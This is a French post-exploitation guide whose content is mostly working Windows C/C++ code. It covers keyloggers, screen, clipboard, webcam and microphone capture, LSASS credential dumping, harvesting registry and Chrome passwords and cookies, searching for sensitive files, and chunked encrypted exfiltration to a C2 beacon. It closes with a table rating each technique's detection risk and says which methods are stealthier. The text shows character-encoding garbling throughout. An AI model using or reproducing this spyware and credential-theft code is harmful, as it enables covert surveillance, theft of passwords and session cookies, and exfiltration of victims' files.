# Guide Post-Exploitation & Keylogger

## Table des matiÃ¨res
1. [Keylogger](#keylogger)
2. [Screenshot](#screenshot)
3. [Clipboard](#clipboard)
4. [Webcam / Micro](#webcam--micro)
5. [Credential Harvesting](#credential-harvesting)
6. [File Exfiltration](#file-exfiltration)
7. [Browser Data](#browser-data)

---

## Keylogger

### MÃ©thodes de keylogging

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              MÃ‰THODES DE KEYLOGGING                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                              â”‚
â”‚  1. SetWindowsHookEx (Hook global)                          â”‚
â”‚     - Hook WH_KEYBOARD_LL                                   â”‚
â”‚     - Capture toutes les frappes                            â”‚
â”‚     - NÃ©cessite message loop                                â”‚
â”‚     - DÃ©tectable par AV/EDR                                 â”‚
â”‚                                                              â”‚
â”‚  2. GetAsyncKeyState (Polling)                              â”‚
â”‚     - Poll chaque touche en boucle                          â”‚
â”‚     - Moins prÃ©cis                                          â”‚
â”‚     - Moins dÃ©tectÃ©                                         â”‚
â”‚                                                              â”‚
â”‚  3. Raw Input API                                           â”‚
â”‚     - RegisterRawInputDevices                               â”‚
â”‚     - Capture au niveau driver                              â”‚
â”‚     - Plus bas niveau                                       â”‚
â”‚                                                              â”‚
â”‚  4. DirectInput                                             â”‚
â”‚     - API gaming de DirectX                                 â”‚
â”‚     - Rarement surveillÃ©                                    â”‚
â”‚                                                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### MÃ©thode 1: SetWindowsHookEx (la plus commune)

```c
#include <windows.h>
#include <stdio.h>

HHOOK hHook = NULL;
FILE* logFile = NULL;

// Callback appelÃ© Ã  chaque frappe
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        
        // Convertir en caractÃ¨re
        char key[16] = {0};
        
        if (vkCode >= 0x30 && vkCode <= 0x5A) {
            // Lettres et chiffres
            key[0] = (char)vkCode;
        } else {
            // Touches spÃ©ciales
            switch (vkCode) {
                case VK_RETURN: strcpy(key, "[ENTER]\n"); break;
                case VK_SPACE:  strcpy(key, " "); break;
                case VK_TAB:    strcpy(key, "[TAB]"); break;
                case VK_BACK:   strcpy(key, "[BACK]"); break;
                case VK_SHIFT:  strcpy(key, "[SHIFT]"); break;
                case VK_CONTROL:strcpy(key, "[CTRL]"); break;
                default:        sprintf(key, "[0x%02X]", vkCode); break;
            }
        }
        
        // Logger
        if (logFile) {
            fprintf(logFile, "%s", key);
            fflush(logFile);
        }
        
        // Aussi capturer la fenÃªtre active
        HWND hwnd = GetForegroundWindow();
        char title[256];
        GetWindowText(hwnd, title, sizeof(title));
        // Logger le titre de la fenÃªtre si changÃ©
    }
    
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void StartKeylogger() {
    logFile = fopen("C:\\Temp\\keys.log", "a");
    
    // Installer le hook global
    hHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,      // Type de hook
        KeyboardProc,         // Callback
        GetModuleHandle(NULL),
        0                     // 0 = global (tous les threads)
    );
    
    // Message loop obligatoire pour les hooks
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void StopKeylogger() {
    if (hHook) UnhookWindowsHookEx(hHook);
    if (logFile) fclose(logFile);
}
```

### MÃ©thode 2: GetAsyncKeyState (plus discret)

```c
#include <windows.h>
#include <stdio.h>

void KeyloggerPolling() {
    FILE* logFile = fopen("C:\\Temp\\keys.log", "a");
    
    while (1) {
        for (int key = 8; key <= 255; key++) {
            // Check si la touche vient d'Ãªtre pressÃ©e
            if (GetAsyncKeyState(key) & 0x0001) {
                char buffer[32] = {0};
                
                // Convertir le virtual key code
                if (key >= 32 && key <= 126) {
                    // CaractÃ¨res imprimables
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);
                    
                    WORD ascii;
                    if (ToAscii(key, 0, keyboardState, &ascii, 0) == 1) {
                        buffer[0] = (char)ascii;
                    }
                } else {
                    // Touches spÃ©ciales
                    sprintf(buffer, "[%d]", key);
                }
                
                if (buffer[0]) {
                    fprintf(logFile, "%s", buffer);
                    fflush(logFile);
                }
            }
        }
        Sleep(10);  // Polling interval
    }
}
```

### Structure de donnÃ©es keylogger

```c
typedef struct {
    DWORD timestamp;
    char window_title[256];
    char process_name[256];
    char keystrokes[4096];
} KeylogEntry;

// Envoyer au C2 pÃ©riodiquement
void SendKeylogData(KeylogEntry* entry) {
    // Chiffrer avec la clÃ© de session
    char* encrypted = encrypt(entry, sizeof(KeylogEntry), session_key);
    
    // Envoyer via beacon
    beacon_send("keylog", encrypted);
}
```

---

## Screenshot

### Capture d'Ã©cran

```c
#include <windows.h>
#include <gdiplus.h>

BOOL CaptureScreen(const char* filename) {
    // Dimensions de l'Ã©cran
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    // Device contexts
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    // Bitmap
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    
    // Copier l'Ã©cran
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    // Sauvegarder en fichier (BMP simple)
    BITMAPFILEHEADER bfh;
    BITMAPINFOHEADER bih;
    
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = width;
    bih.biHeight = height;
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;
    bih.biSizeImage = width * height * 3;
    
    bfh.bfType = 0x4D42;  // "BM"
    bfh.bfSize = sizeof(bfh) + sizeof(bih) + bih.biSizeImage;
    bfh.bfOffBits = sizeof(bfh) + sizeof(bih);
    
    // Ã‰crire le fichier
    FILE* f = fopen(filename, "wb");
    fwrite(&bfh, sizeof(bfh), 1, f);
    fwrite(&bih, sizeof(bih), 1, f);
    
    // Ã‰crire les pixels
    BYTE* pixels = malloc(bih.biSizeImage);
    GetDIBits(hdcMem, hBitmap, 0, height, pixels, (BITMAPINFO*)&bih, DIB_RGB_COLORS);
    fwrite(pixels, bih.biSizeImage, 1, f);
    
    fclose(f);
    free(pixels);
    
    // Cleanup
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    return TRUE;
}
```

### Capture fenÃªtre spÃ©cifique

```c
BOOL CaptureWindow(HWND hwnd, const char* filename) {
    RECT rect;
    GetWindowRect(hwnd, &rect);
    int width = rect.right - rect.left;
    int height = rect.bottom - rect.top;
    
    HDC hdcWindow = GetWindowDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcWindow);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcWindow, width, height);
    
    SelectObject(hdcMem, hBitmap);
    PrintWindow(hwnd, hdcMem, 0);
    
    // Sauvegarder...
    // (mÃªme code que ci-dessus)
    
    return TRUE;
}
```

---

## Clipboard

### Surveillance du presse-papier

```c
#include <windows.h>
#include <stdio.h>

// Surveiller le clipboard en continu
void MonitorClipboard() {
    char lastContent[4096] = {0};
    
    while (1) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* text = (char*)GlobalLock(hData);
                if (text && strcmp(text, lastContent) != 0) {
                    // Nouveau contenu
                    strcpy(lastContent, text);
                    
                    // Logger ou envoyer au C2
                    LogClipboard(text);
                }
                GlobalUnlock(hData);
            }
            CloseClipboard();
        }
        Sleep(1000);  // Check toutes les secondes
    }
}

// Alternative: Hook avec SetClipboardViewer
HWND hNextViewer = NULL;

LRESULT CALLBACK ClipboardWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_DRAWCLIPBOARD:
            // Le clipboard a changÃ©
            if (OpenClipboard(hwnd)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char* text = (char*)GlobalLock(hData);
                    if (text) {
                        LogClipboard(text);
                    }
                    GlobalUnlock(hData);
                }
                CloseClipboard();
            }
            // Passer au viewer suivant
            if (hNextViewer) SendMessage(hNextViewer, msg, wParam, lParam);
            break;
            
        case WM_CHANGECBCHAIN:
            if ((HWND)wParam == hNextViewer)
                hNextViewer = (HWND)lParam;
            else if (hNextViewer)
                SendMessage(hNextViewer, msg, wParam, lParam);
            break;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}
```

---

## Webcam / Micro

### Capture webcam (via DirectShow)

```cpp
// NÃ©cessite DirectShow (dshow.h, strmiids.lib)
#include <dshow.h>

class WebcamCapture {
    IGraphBuilder* pGraph;
    ICaptureGraphBuilder2* pBuilder;
    IMediaControl* pControl;
    IBaseFilter* pCap;
    
public:
    BOOL Initialize() {
        CoInitialize(NULL);
        
        // CrÃ©er le graph
        CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER,
            IID_IGraphBuilder, (void**)&pGraph);
        
        CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER,
            IID_ICaptureGraphBuilder2, (void**)&pBuilder);
        
        pBuilder->SetFiltergraph(pGraph);
        
        // Ã‰numÃ©rer les devices
        ICreateDevEnum* pDevEnum;
        CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
            IID_ICreateDevEnum, (void**)&pDevEnum);
        
        IEnumMoniker* pEnum;
        pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
        
        // Prendre le premier
        IMoniker* pMoniker;
        if (pEnum->Next(1, &pMoniker, NULL) == S_OK) {
            pMoniker->BindToObject(NULL, NULL, IID_IBaseFilter, (void**)&pCap);
            pGraph->AddFilter(pCap, L"Webcam");
        }
        
        return TRUE;
    }
    
    BOOL CaptureFrame(const char* filename) {
        // Capturer une frame et sauvegarder
        // ... (code complexe avec ISampleGrabber)
        return TRUE;
    }
};
```

### Capture audio / microphone

```cpp
// Via WASAPI (Windows Audio Session API)
#include <audioclient.h>
#include <mmdeviceapi.h>

class MicrophoneCapture {
    IMMDeviceEnumerator* pEnumerator;
    IMMDevice* pDevice;
    IAudioClient* pAudioClient;
    IAudioCaptureClient* pCaptureClient;
    WAVEFORMATEX* pwfx;
    
public:
    BOOL Initialize() {
        CoInitialize(NULL);
        
        CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
            __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
        
        // Microphone par dÃ©faut
        pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
        pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
        
        pAudioClient->GetMixFormat(&pwfx);
        pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL);
        pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
        
        return TRUE;
    }
    
    BOOL StartRecording(const char* filename, int durationSeconds) {
        pAudioClient->Start();
        
        FILE* f = fopen(filename, "wb");
        // Ã‰crire header WAV...
        
        DWORD startTime = GetTickCount();
        while (GetTickCount() - startTime < durationSeconds * 1000) {
            BYTE* pData;
            UINT32 numFrames;
            DWORD flags;
            
            pCaptureClient->GetBuffer(&pData, &numFrames, &flags, NULL, NULL);
            if (numFrames > 0) {
                fwrite(pData, pwfx->nBlockAlign * numFrames, 1, f);
            }
            pCaptureClient->ReleaseBuffer(numFrames);
            
            Sleep(10);
        }
        
        pAudioClient->Stop();
        fclose(f);
        return TRUE;
    }
};
```

---

## Credential Harvesting

### Sources de credentials

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              SOURCES DE CREDENTIALS                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                              â”‚
â”‚  MÃ‰MOIRE                                                    â”‚
â”‚  - LSASS (hashes NTLM, tickets Kerberos)                   â”‚
â”‚  - Browsers (cookies de session)                            â”‚
â”‚  - Applications (clÃ©s en mÃ©moire)                           â”‚
â”‚                                                              â”‚
â”‚  FICHIERS                                                   â”‚
â”‚  - SAM/SYSTEM/SECURITY (hashes locaux)                     â”‚
â”‚  - Browser profiles (passwords sauvegardÃ©s)                â”‚
â”‚  - Config files (web.config, etc.)                         â”‚
â”‚  - SSH keys (~/.ssh/id_rsa)                                â”‚
â”‚  - KeePass databases (*.kdbx)                              â”‚
â”‚                                                              â”‚
â”‚  REGISTRY                                                   â”‚
â”‚  - Autologon credentials                                    â”‚
â”‚  - VNC passwords                                            â”‚
â”‚  - PuTTY sessions                                          â”‚
â”‚                                                              â”‚
â”‚  RÃ‰SEAU                                                     â”‚
â”‚  - LLMNR/NBT-NS poisoning                                  â”‚
â”‚  - Kerberoasting                                           â”‚
â”‚  - MITM                                                    â”‚
â”‚                                                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### LSASS Dump (Mimikatz style)

```c
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>

// Trouver le PID de lsass.exe
DWORD GetLsassPid() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};
    
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return 0;
}

// Dumper LSASS (nÃ©cessite SeDebugPrivilege)
BOOL DumpLsass(const char* filename) {
    DWORD pid = GetLsassPid();
    if (!pid) return FALSE;
    
    // Ouvrir lsass
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    // CrÃ©er le fichier dump
    HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    // MiniDumpWriteDump
    BOOL result = MiniDumpWriteDump(
        hProcess,
        pid,
        hFile,
        MiniDumpWithFullMemory,
        NULL, NULL, NULL
    );
    
    CloseHandle(hFile);
    CloseHandle(hProcess);
    
    return result;
}
```

### Registry credentials

```c
// Autologon
void GetAutologonCreds() {
    HKEY hKey;
    char username[256], password[256], domain[256];
    DWORD size;
    
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_READ, &hKey);
    
    size = sizeof(username);
    RegQueryValueEx(hKey, "DefaultUserName", NULL, NULL, (BYTE*)username, &size);
    
    size = sizeof(password);
    RegQueryValueEx(hKey, "DefaultPassword", NULL, NULL, (BYTE*)password, &size);
    
    size = sizeof(domain);
    RegQueryValueEx(hKey, "DefaultDomainName", NULL, NULL, (BYTE*)domain, &size);
    
    RegCloseKey(hKey);
    
    printf("Autologon: %s\\%s : %s\n", domain, username, password);
}

// PuTTY sessions
void GetPuttySessions() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\SimonTatham\\PuTTY\\Sessions",
        0, KEY_READ, &hKey);
    
    char sessionName[256];
    DWORD index = 0;
    while (RegEnumKey(hKey, index++, sessionName, sizeof(sessionName)) == ERROR_SUCCESS) {
        // Lire les dÃ©tails de chaque session
        HKEY hSession;
        char subkey[512];
        sprintf(subkey, "Software\\SimonTatham\\PuTTY\\Sessions\\%s", sessionName);
        
        RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_READ, &hSession);
        
        char hostname[256];
        DWORD size = sizeof(hostname);
        RegQueryValueEx(hSession, "HostName", NULL, NULL, (BYTE*)hostname, &size);
        
        printf("PuTTY Session: %s -> %s\n", sessionName, hostname);
        
        RegCloseKey(hSession);
    }
    RegCloseKey(hKey);
}
```

---

## File Exfiltration

### Recherche de fichiers intÃ©ressants

```c
#include <windows.h>
#include <stdio.h>

typedef struct {
    char* extension;
    char* description;
} FileType;

FileType interestingFiles[] = {
    {".docx", "Word documents"},
    {".xlsx", "Excel spreadsheets"},
    {".pdf", "PDF documents"},
    {".pptx", "PowerPoint"},
    {".txt", "Text files"},
    {".kdbx", "KeePass database"},
    {".key", "Private keys"},
    {".pem", "Certificates"},
    {".pfx", "PKCS12 certificates"},
    {".rdp", "RDP files"},
    {".sql", "SQL files"},
    {".config", "Config files"},
    {NULL, NULL}
};

void SearchFiles(const char* directory, const char* extension) {
    WIN32_FIND_DATA ffd;
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", directory);
    
    HANDLE hFind = FindFirstFile(searchPath, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(ffd.cFileName, ".") != 0 && strcmp(ffd.cFileName, "..") != 0) {
                char subdir[MAX_PATH];
                sprintf(subdir, "%s\\%s", directory, ffd.cFileName);
                SearchFiles(subdir, extension);
            }
        } else {
            // VÃ©rifier l'extension
            char* ext = strrchr(ffd.cFileName, '.');
            if (ext && _stricmp(ext, extension) == 0) {
                char fullPath[MAX_PATH];
                sprintf(fullPath, "%s\\%s", directory, ffd.cFileName);
                printf("Found: %s (%lld bytes)\n", fullPath, 
                    ((LONGLONG)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow);
            }
        }
    } while (FindNextFile(hFind, &ffd));
    
    FindClose(hFind);
}
```

### Exfiltration chunked

```c
#define CHUNK_SIZE (1024 * 1024)  // 1 MB chunks

BOOL ExfiltrateFile(const char* filepath) {
    FILE* f = fopen(filepath, "rb");
    if (!f) return FALSE;
    
    // Taille du fichier
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    // Lire et envoyer par chunks
    char* buffer = malloc(CHUNK_SIZE);
    int chunkNum = 0;
    
    while (!feof(f)) {
        size_t bytesRead = fread(buffer, 1, CHUNK_SIZE, f);
        if (bytesRead > 0) {
            // Chiffrer
            char* encrypted = encrypt(buffer, bytesRead, session_key);
            
            // Envoyer au C2
            beacon_send_chunk(filepath, chunkNum, encrypted, bytesRead);
            
            chunkNum++;
        }
    }
    
    free(buffer);
    fclose(f);
    return TRUE;
}
```

---

## Browser Data

### Chrome credentials

```c
#include <windows.h>
#include <sqlite3.h>
// Chrome stocke les passwords dans SQLite avec DPAPI

void GetChromePasswords() {
    char path[MAX_PATH];
    char* appdata = getenv("LOCALAPPDATA");
    sprintf(path, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", appdata);
    
    // Copier car Chrome lock le fichier
    char tempPath[MAX_PATH];
    sprintf(tempPath, "%s\\Temp\\login_data.db", getenv("LOCALAPPDATA"));
    CopyFile(path, tempPath, FALSE);
    
    // Ouvrir SQLite
    sqlite3* db;
    sqlite3_open(tempPath, &db);
    
    sqlite3_stmt* stmt;
    sqlite3_prepare_v2(db, 
        "SELECT origin_url, username_value, password_value FROM logins",
        -1, &stmt, NULL);
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char* url = (const char*)sqlite3_column_text(stmt, 0);
        const char* user = (const char*)sqlite3_column_text(stmt, 1);
        const void* encPass = sqlite3_column_blob(stmt, 2);
        int encLen = sqlite3_column_bytes(stmt, 2);
        
        // DÃ©chiffrer avec DPAPI
        DATA_BLOB in, out;
        in.pbData = (BYTE*)encPass;
        in.cbData = encLen;
        
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            printf("URL: %s\nUser: %s\nPass: %.*s\n\n", 
                url, user, out.cbData, out.pbData);
            LocalFree(out.pbData);
        }
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFile(tempPath);
}
```

### Chrome cookies

```c
void GetChromeCookies() {
    char path[MAX_PATH];
    char* appdata = getenv("LOCALAPPDATA");
    sprintf(path, "%s\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", appdata);
    
    // Copier et ouvrir SQLite
    // ... similaire au code passwords
    
    sqlite3_prepare_v2(db,
        "SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies",
        -1, &stmt, NULL);
    
    // DÃ©chiffrer avec DPAPI ou AES-GCM (Chrome 80+)
}
```

---

## RÃ©sumÃ© des techniques

| Technique | UtilitÃ© | Risque dÃ©tection |
|-----------|---------|------------------|
| **Keylogger hook** | Capture tout | âš ï¸ Ã‰levÃ© |
| **Keylogger polling** | Moins prÃ©cis | âœ… Faible |
| **Screenshot** | Preuves visuelles | âœ… Faible |
| **Clipboard** | Passwords copiÃ©s | âœ… Faible |
| **Webcam** | Surveillance | âš ï¸ Moyen |
| **LSASS dump** | Hashes/tickets | ğŸ”´ TrÃ¨s Ã©levÃ© |
| **Browser creds** | Passwords | âš ï¸ Moyen |
| **File search** | Documents | âœ… Faible |
